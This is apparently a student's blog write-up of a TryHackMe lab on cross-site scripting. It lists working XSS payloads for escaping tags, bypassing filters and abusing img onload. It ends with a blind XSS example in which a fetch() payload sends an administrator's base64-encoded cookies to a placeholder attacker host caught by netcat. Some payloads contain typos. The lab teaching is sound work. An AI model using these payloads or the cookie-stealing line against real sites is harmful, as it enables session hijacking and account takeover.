---
layout: single
title: "THM Exploits #3 Cross-Site Scripting"
---
#### TryHackMe Room: Jr Penetration Tester path: Web Application Hacking: XSS (Cross-Site Scripting) 

### Perfecting your Payload 

#### Level 1: Payload in input form 

In the first exercise, we see an input form that prompts to enter our name. Doing that, we get an error message, 'XSS Payload Failed'.

![img]({{site.url}}/images/2023-09-23-twelfth/                                                      Screenshot%202023-09-22%20at%2018.40.37.png)


We can put in 

`<script>ale4rt('THM');</script>`
in the form: 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.41.25.png)

Which will give us this pop-up.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.41.42.png)


Checking the page source, we can see the JavaScript code was successfully injected.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.46.35.png)

---
#### Level 2: Escaping input tag

This time, the form looks a bit different. Once inputting the name, it is reflected in the input tag. 
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.47.20.png)

This can be confirmed by checking the page source.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.48.20.png)

The previous JS payload won't work in the input tag. Instead, we can use the following: 


">script>alert('THM');</script>


The `">` at the front will close the value parameter and then close the input tag. Closing the input tag will allow the payload to run.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.50.20.png)

The payload runs and we get the alert. 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.51.46.png)

---
#### Level 3: Payload in textarea tag

At this stage, the name is reflected in the textarea tag. Again, this can be confirmed by viewing the page source.
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.54.23.png)

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.54.06.png)


We'll have to escape the textarea tag a little differently from level 2 by using the following payload: 


</textarea><script>alert('THM');</script>`


The `</textarea>` portion of the payload causes the textarea element to close so the script will run.
`
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.55.40.png)

Success!

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.56.21.png)

Check the page source to confim the changes.

---

#### Level 4: Escaping JS code

At this stage, the interface looks similar to level 1 but the page source reveals that the name is reflected in some JavaScript code. 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2018.58.14.png)

You'll have to escape the existing JavaScript command with the following payload: 

`';alert('THM');//`

The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

We get the alert, and the page source reveals our payload has been executed. 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.01.10.png)

---

#### Level 5: Escaping string filters

Level 5 looks similar to level 2 on the surface. However, executing  `<script>alert('THM');</script>` doesn't work. Let's look at the page source to figure out why.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.04.04.png)

The word 'script' has disappeared due to filters. Alternatively, we can use the following payload to escape these filters: 


<sscriptcript>alert('THM');</sscriptcript>


The word 'script' squeezed into the middle will be filtered out once, leaving the first 's' and the following 'script' to form and execute the payload. 

The resulting page source shows it worked: 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.06.25.png)

---

#### Level 6: Escaping IMG tag
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.07.24.png)

Level 6 seems similar to level 2, where we had to escape from the value attribute of an input tag, so we can try `"><script>alert('THM');</script>` .
But that doesn't seem to work. Let's inspect the page source to see why. 
 
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.10.27.png)

You can see that the `<` and `>` characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the ==**onload event**==. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this:

```JavaScript
/images/cat.jpg" onload="alert('THM')
```

And then viewing the page source, and you'll see how this will work.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.13.53.png)
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-22%20at%2019.14.10.png)


---

#### All payloads from exercises

Original payload
<script>alert('THM');</script>

Escaping input tag
"><script>alert('THM');</script>

Escaping textarea tag
</textarea><script>alert('THM');</script> 

Escaping JS code
';alert('THM');//

Escaping filters
<sscriptcript>alert('THM');</sscriptcript>

Escaping img tag & using onload event
/images/cat.jpg" onload="alert('THM');

---

### Practical Example (Blind XSS) 

In this exercise, we are tasked to inject JavaScript code into the contents of an IT Support ticket. Once the administrator opens the ticket to view it, the code will execute and send their cookie session info back to us, revealing login information and allowing us to escalate privileges.

**1. Test stage**
So we've made a (fake) customer account on the Acme IT Support website. Under the 'Support Tickets' tab, we can create tickets. Here is a test run: 

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2015.32.47.png)

Because our input is shown in the textarea, let's see if we can escape this like we did in level 3 of 'Perfecting Your Payload'. We can use the payload `</textarea>test`. </textarea> wil help us escape the textarea tag. 
 
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2015.32.30.png)

It worked. 
Now let's try this again to prompt an alert message. The payload is `</textarea><script>alert('THM');</script>.
`
![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2015.35.17.png)


**2. The Attack** 

Now, let's try to steal the administrator's session cookies by injecting JavaScript code.
First, we're going to set up a callback. Let's open a Netcat server listening on port 9001 to receive the cookies. 

If we want to listen on port 8000, issue the command`nc -l -p 9001`.
- `-l`  indicates that we want to use Netcat in listen mode
- `-p`  is used to specify the port number.
- `-n` to avoid the resolution of hostnames via DNS,
- moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended.
- The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2015.35.53.png)![]

Now, let's inject our payload into the ticket. The payload we'll use is: 

```Javascript
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
```

Let’s break down the payload:

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.


![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2016.00.31.png)


Once submitted, the listening server will put out the stolen cookies. Shown below is that output and the base64 decoding of the cookie using the echo command.

![img]({{site.url}}/images/2023-09-23-twelfth/Screenshot%202023-09-23%20at%2015.58.21.png)

---